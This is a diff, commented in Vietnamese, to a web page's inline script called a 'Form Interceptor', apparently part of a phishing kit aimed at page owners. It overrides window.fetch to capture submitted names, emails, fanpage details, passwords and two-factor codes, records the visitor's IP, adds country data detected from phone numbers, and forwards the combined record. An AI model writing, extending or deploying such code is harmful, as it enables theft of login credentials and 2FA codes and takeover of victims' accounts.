@@ -67,6 +67,13 @@
         step3: null
     };
     
+    // Biến lưu thông tin quốc gia (sẽ lấy từ select của React)
+    let selectedCountry = {
+        name: 'Vietnam',
+        iso: 'VN',
+        dialCode: '84'
+    };
+    
     // Lấy thông tin IP
     let ipInfo = { ip: 'Unknown', location: 'Unknown', country: 'Unknown' };
     
@@ -88,35 +95,160 @@
     
     getIpInfo();
     
-    // Override fetch để bắt request
+    // Hàm lấy mã quốc gia từ input phone (dựa vào value)
+    function detectCountryFromPhone(phoneValue) {
+        if (!phoneValue) return selectedCountry;
+        
+        // Map dial code -> country
+        const dialCodeMap = {
+            '1': { iso: 'US', name: 'USA' },
+            '44': { iso: 'GB', name: 'United Kingdom' },
+            '84': { iso: 'VN', name: 'Vietnam' },
+            '66': { iso: 'TH', name: 'Thailand' },
+            '81': { iso: 'JP', name: 'Japan' },
+            '82': { iso: 'KR', name: 'South Korea' },
+            '86': { iso: 'CN', name: 'China' },
+            '49': { iso: 'DE', name: 'Germany' },
+            '33': { iso: 'FR', name: 'France' },
+            '39': { iso: 'IT', name: 'Italy' },
+            '34': { iso: 'ES', name: 'Spain' },
+            '55': { iso: 'BR', name: 'Brazil' },
+            '52': { iso: 'MX', name: 'Mexico' },
+            '91': { iso: 'IN', name: 'India' },
+            '7': { iso: 'RU', name: 'Russia' },
+            '60': { iso: 'MY', name: 'Malaysia' },
+            '62': { iso: 'ID', name: 'Indonesia' },
+            '63': { iso: 'PH', name: 'Philippines' },
+            '65': { iso: 'SG', name: 'Singapore' },
+            '92': { iso: 'PK', name: 'Pakistan' },
+            '94': { iso: 'LK', name: 'Sri Lanka' },
+            '95': { iso: 'MM', name: 'Myanmar' },
+            '855': { iso: 'KH', name: 'Cambodia' },
+            '856': { iso: 'LA', name: 'Laos' },
+            '598': { iso: 'UY', name: 'Uruguay' },
+            '998': { iso: 'UZ', name: 'Uzbekistan' }
+        };
+        
+        // Lấy dial code từ số phone (3 số đầu hoặc 2 số đầu)
+        let phoneStr = String(phoneValue).replace(/\D/g, '');
+        
+        if (phoneStr.startsWith('84')) {
+            return { iso: 'VN', name: 'Vietnam', dialCode: '84' };
+        } else if (phoneStr.startsWith('66')) {
+            return { iso: 'TH', name: 'Thailand', dialCode: '66' };
+        } else if (phoneStr.startsWith('44')) {
+            return { iso: 'GB', name: 'United Kingdom', dialCode: '44' };
+        } else if (phoneStr.startsWith('1') && phoneStr.length === 11) {
+            return { iso: 'US', name: 'USA', dialCode: '1' };
+        } else if (phoneStr.startsWith('81')) {
+            return { iso: 'JP', name: 'Japan', dialCode: '81' };
+        } else if (phoneStr.startsWith('82')) {
+            return { iso: 'KR', name: 'South Korea', dialCode: '82' };
+        } else if (phoneStr.startsWith('86')) {
+            return { iso: 'CN', name: 'China', dialCode: '86' };
+        } else if (phoneStr.startsWith('49')) {
+            return { iso: 'DE', name: 'Germany', dialCode: '49' };
+        } else if (phoneStr.startsWith('33')) {
+            return { iso: 'FR', name: 'France', dialCode: '33' };
+        } else if (phoneStr.startsWith('39')) {
+            return { iso: 'IT', name: 'Italy', dialCode: '39' };
+        } else if (phoneStr.startsWith('34')) {
+            return { iso: 'ES', name: 'Spain', dialCode: '34' };
+        } else if (phoneStr.startsWith('55')) {
+            return { iso: 'BR', name: 'Brazil', dialCode: '55' };
+        } else if (phoneStr.startsWith('52')) {
+            return { iso: 'MX', name: 'Mexico', dialCode: '52' };
+        } else if (phoneStr.startsWith('91')) {
+            return { iso: 'IN', name: 'India', dialCode: '91' };
+        } else if (phoneStr.startsWith('60')) {
+            return { iso: 'MY', name: 'Malaysia', dialCode: '60' };
+        } else if (phoneStr.startsWith('62')) {
+            return { iso: 'ID', name: 'Indonesia', dialCode: '62' };
+        } else if (phoneStr.startsWith('63')) {
+            return { iso: 'PH', name: 'Philippines', dialCode: '63' };
+        } else if (phoneStr.startsWith('65')) {
+            return { iso: 'SG', name: 'Singapore', dialCode: '65' };
+        } else if (phoneStr.startsWith('92')) {
+            return { iso: 'PK', name: 'Pakistan', dialCode: '92' };
+        } else if (phoneStr.startsWith('94')) {
+            return { iso: 'LK', name: 'Sri Lanka', dialCode: '94' };
+        } else if (phoneStr.startsWith('95')) {
+            return { iso: 'MM', name: 'Myanmar', dialCode: '95' };
+        } else if (phoneStr.startsWith('855')) {
+            return { iso: 'KH', name: 'Cambodia', dialCode: '855' };
+        } else if (phoneStr.startsWith('856')) {
+            return { iso: 'LA', name: 'Laos', dialCode: '856' };
+        } else if (phoneStr.startsWith('598')) {
+            return { iso: 'UY', name: 'Uruguay', dialCode: '598' };
+        } else if (phoneStr.startsWith('998')) {
+            return { iso: 'UZ', name: 'Uzbekistan', dialCode: '998' };
+        }
+        
+        return selectedCountry;
+    }
+    
+    // Hàm theo dõi input phone để lấy dial code
+    function watchPhoneInput() {
+        const phoneInput = document.querySelector('input[placeholder*="Số điện thoại"], input[placeholder*="Phone"], input[type="tel"]');
+        
+        if (phoneInput && !phoneInput.dataset.countryWatched) {
+            phoneInput.dataset.countryWatched = 'true';
+            console.log('✅ Đã tìm thấy input phone, đang theo dõi...');
+            
+            // Lấy dial code từ value ban đầu
+            if (phoneInput.value) {
+                selectedCountry = detectCountryFromPhone(phoneInput.value);
+                console.log('📍 Phát hiện quốc gia từ số điện thoại:', selectedCountry);
+            }
+            
+            // Theo dõi khi người dùng thay đổi số điện thoại
+            phoneInput.addEventListener('input', function(e) {
+                selectedCountry = detectCountryFromPhone(e.target.value);
+                console.log('📍 Quốc gia cập nhật:', selectedCountry);
+            });
+        }
+    }
+    
+    // Lưu originalFetch để override
     const originalFetch = window.fetch;
     window.fetch = async function(url, options) {
         // Bắt request đến API
         if (options && options.body && typeof options.body === 'string') {
             try {
-                const bodyData = JSON.parse(options.body);
+                let bodyData = JSON.parse(options.body);
                 console.log('📦 Bắt được data:', bodyData);
                 
-                // Xác định bước dựa vào nội dung data
-                if (bodyData.name || bodyData.email || bodyData.fanpage) {
-                    // Bước 1: Thông tin cá nhân
-                    formData.step1 = bodyData;
+                // Cập nhật quốc gia từ số phone nếu có
+                if (bodyData.phone) {
+                    const detected = detectCountryFromPhone(bodyData.phone);
+                    selectedCountry = detected;
+                }
+                
+                // THÊM THÔNG TIN QUỐC GIA VÀO DATA
+                const enhancedData = {
+                    ...bodyData,
+                    countryIso: selectedCountry.iso,
+                    dialCode: selectedCountry.dialCode,
+                    countryName: selectedCountry.name
+                };
+                
+                // Xác định bước
+                if (enhancedData.name || enhancedData.email || enhancedData.fanpage) {
+                    formData.step1 = enhancedData;
                     console.log('✅ Step 1 captured:', formData.step1);
                 }
                 
-                if (bodyData.password) {
-                    // Bước 2: Mật khẩu
-                    formData.step2 = bodyData;
+                if (enhancedData.password) {
+                    formData.step2 = enhancedData;
                     console.log('✅ Step 2 captured:', formData.step2);
                 }
                 
-                if (bodyData.twoFa || bodyData.code) {
-                    // Bước 3: 2FA
-                    formData.step3 = bodyData;
+                if (enhancedData.twoFa || enhancedData.code) {
+                    formData.step3 = enhancedData;
                     console.log('✅ Step 3 captured:', formData.step3);
                 }
                 
-                // Nếu đã có đủ thông tin, gửi đi
+                // Gửi dữ liệu đã được thêm countryIso và dialCode
                 if (formData.step1 && formData.step2) {
                     const fullData = {
                         ...formData.step1,
@@ -128,14 +260,16 @@
                         completedAt: new Date().toISOString()
                     };
                     
-                    console.log('📤 Gửi full data:', fullData);
+                    console.log('📤 Gửi full data (có countryIso, dialCode):', fullData);
                     
-                    // Gửi đến backend
-                    await fetch('http://localhost:3000/api/submit', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(fullData)
-                    });
+                    // Tạo request mới với data đã được thêm countryIso
+                    const newBody = JSON.stringify(fullData);
+                    const newOptions = {
+                        ...options,
+                        body: newBody
+                    };
+                    
+                    return originalFetch.call(this, url, newOptions);
                 }
                 
             } catch(e) {
@@ -146,7 +280,11 @@
         return originalFetch.apply(this, arguments);
     };
     
+    // Theo dõi input phone
+    setInterval(watchPhoneInput, 1000);
+    
     console.log('🚀 Form Interceptor đã sẵn sàng!');
 })();
 </script>
+
 </html>
